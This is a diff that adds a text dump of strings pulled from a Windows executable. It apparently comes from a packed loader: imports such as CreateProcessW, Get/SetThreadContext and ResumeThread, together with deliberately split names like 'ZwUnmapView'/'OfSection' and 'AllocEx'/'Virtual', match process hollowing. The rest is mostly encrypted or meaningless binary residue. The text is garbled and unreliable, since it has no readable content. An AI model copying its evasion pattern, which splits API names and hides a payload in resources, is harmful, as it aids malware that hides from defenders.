@@ -1,0 +1,381 @@
+!This program cannot be run in DOS mode.
+P`.data
+.rdata
+`@.eh_fram 
+0@.bss
+.idata
+\$09\$
+D$$9D$
+D$D9E$rT
+C(9C$u
+D$\)D$
+<\t5</t1
+<\tP</tL
+D$p9D$0
+D$\9D$
+9l$Xv,
+9|$Xv7
+libgcc_s_dw2-1.dll
+__register_frame_info
+libgcj-13.dll
+_Jv_RegisterClasses
+__deregister_frame_info
+ntdll.dll
+Memory
+%s%Process%s
+SetThreadContext
+ResumeThread
+CoCreateInstance
+ole32.dll
+CoInitializeEx
+J=oG@nI
+nCO&BB
+ccJYo7V!
+P69!Fwu
+dn$\_B
+Mingw runtime failure:
+  VirtualQuery failed for %d bytes at address %p
+  Unknown pseudo relocation protocol version %d.
+  Unknown pseudo relocation bit size %d.
+glob-1.0-mingw32
+(null)
+PRINTF_EXPONENT_DIGITS
+Infinity
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.2
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.1
+GCC: (GNU) 4.8.1
+CreateProcessW
+DeleteCriticalSection
+EnterCriticalSection
+ExitProcess
+FindClose
+FindFirstFileA
+FindNextFileA
+FindResourceW
+GetCommandLineA
+GetCommandLineW
+GetLastError
+GetModuleHandleA
+GetProcAddress
+GetStartupInfoA
+GetThreadContext
+InitializeCriticalSection
+InterlockedExchange
+IsDBCSLeadByteEx
+LeaveCriticalSection
+LoadLibraryA
+LoadLibraryW
+LoadResource
+LockResource
+MultiByteToWideChar
+SetUnhandledExceptionFilter
+SizeofResource
+TlsGetValue
+VirtualProtect
+VirtualQuery
+WideCharToMultiByte
+_strdup
+_stricoll
+__getmainargs
+__mb_cur_max
+__p__environ
+__p__fmode
+__set_app_type
+_cexit
+_errno
+_fullpath
+_onexit
+_setmode
+atexit
+calloc
+fwrite
+getenv
+isspace
+localeconv
+malloc
+mbstowcs
+memcpy
+realloc
+setlocale
+signal
+sprintf
+strchr
+strcoll
+strlen
+tolower
+vfprintf
+wcslen
+wcstombs
+CommandLineToArgvW
+KERNEL32.dll
+msvcrt.dll
+msvcrt.dll
+SHELL32.DLL
+HT!!!Y!!!YT
+J<<<pbbb
+>545jppq
+7*)+^uuv
+4#Z)* G
+H9m4( G
+PAuA, K
+SCwF- N
+UDzE/"Q
+UE}?7'Z
+Q?}0;,c
+?,o#=.f
+Q<<<qVVV
+3!!!U[[[
+<EEFywww
+">>>lzzz
+///TVVV
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>  
+ <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">    
+ <security>
+<requestedPrivileges>       
+<requestedExecutionLevel level='asInvoker' uiAccess='false' />      
+</requestedPrivileges>    
+  </security>
+</trustInfo>
+</assembly>
+123456789123456789]
+{_aPkSX
+|i/!00
+Prc=@Mk
+klE;_~
+vpwScg
+g>t|Z
+U3$<qL
+S;QNi_k
+11\`@k#
+wtQ?yF
+Sowkr/
+7ZNbVx
+2rZ~c`u
+IzT0&lG
+{Bod3\
+;ued`s 
+#UX~#k
+uc{@Y`
+VN%\R
+ub&cBp
+@u^6<e
+gn35!b#
+x[&E3*_~
+CN4l0hDv
+VCC^RJ
+ZnXA85np
+wy(<B ^
+Fb+RB^
+a:?7_B
+2#Au$DRJ
+V6Z<-1
+|JJXEY
+4VJS~[
+lr'%au)
+;>$m@4
+QvwwMv
+r.2clgS
+}R~>bY
+}}Csuz
+1mN8 l
+@dG3mw
+}'75F3
+%E0J ~
+^bYnvl
+hMerK!+
+m9zb'G
+RZ?X-#hBi
+N[,5N*
+l/5WX#50\
+s86I9oF
+2L[.Fb
+#Rc/yL
+tY+ePa/H.f`
+<P"AH|
+XP6iI*
+g2T\b\nq
+M`#{We
+$VRv;,
+J~h~:2
+2GtW^%
+_ 1V@W
+'T^evE
+azc$!A
+t=CnO{
+'G%ALX
+.Q@flWri
+8$)r[_F
+lRb:0G
+AaS^q!
+7*d2RXk
+zJ&Vjk<
+w(3!&+[
+^VJB$v
+/9Cc7F
+Ft u[N
+%}*vq'N
+K-t\GzI
+Q+KFB
+>D`jWq
+0m3tkHe
+k{IHi2
+:soa)03UY[
+/NE:},
+UJO9fxr
+7l#QN<
+f}"Wv<h]
+XVvbHC%
+&Db+pp
+{p*J^T
++asM&_
+]G+^9u<N
+S$>GZV/)?
+fN@+R5
+OWf@??
++<BS1D`
+OQt2G
+]/[7plL]K
+q\S.Z1
+nbR:,t
+b)Cm=o^
+\oE\2+
+~p}XN\
+4bz'D)
+CB20+X
+B)F\'2
+rm3H(v'&nx
+mjvL<q&
+be#9A<
+y>C@Vp
+g|bi]{
+F5{&q\
+%b]-z@
+g$v-=4i
+5)asK-n/
+a2qfzGea
+IS(@*.
+!5V;6i
+~L;&b<E
+Ff+^'C
+pxEsf
+PMFV+&
+=5a}5k
+6Y#^":
+Xb8em;
+|R9FC[
+l99"`!M
+Wt$8G!
+wNKAqj
+B4-)cn
+<^#*~k
+,1#w.`
+k3lYXY- 
+jrotM=?f)
+LUC GTJO\
+2x8W 9+P
+I !]1
+L>wv/{
+ f"p&]
+0?'{8&h
+1G?2R2
+_@nG}}
+\8+t>*
+ZD3fM9
+oic|O8*
+s l|k?
+"Ai}{S
+]-oy?;%
+UVcSp$
+3t|#Y 
+HaX$q"o
+}_~XwP
+9-5wNW
+mQaDQ5d]
+!Pppxx
+10bS(@G
+:a\|JxM
+:\!Lu
+_L2FPF
+z)~ 9?A
+^x`pp|i
+>=_S:w9&
+h~IKMJQ
+6E$s;
+wx}[nvS4q
+R6X_"1D|
+=ah%;
+ d$a,&U
+-4^i_Ebp$
+VIWW%*
+ ,!e{Y)hT
+Es0wUu
+Pf]CQ 
+.M:ERW
+9qIy3/>
+GeA/Tu
+,2<Ix
+i1o$>
+q{IVC0C
+%8CoQ,
+G`(&Yj 
+ASO8HT
+|2vy'5
+Cr+fp@
+1u70li
+l!NwTS
+8Tv"2r
+%%Dv7cfa{u
+GBIx}=
+I.O4.[9X
+DK?FvM
+C}/iiESj
+Yywt)hK
+<pvE8S
+\Oec6E
+@IzQ]i}R
+i 4z<i
+#7M"A22
+?t(rdq
+15>q?U
+"a=9lP
+OfSection
+ZwUnmapView
+AllocEx
+Virtual
+CLSID_AsyncReader
+kernel32
+fgh57767
+f(null)
+FGH57767
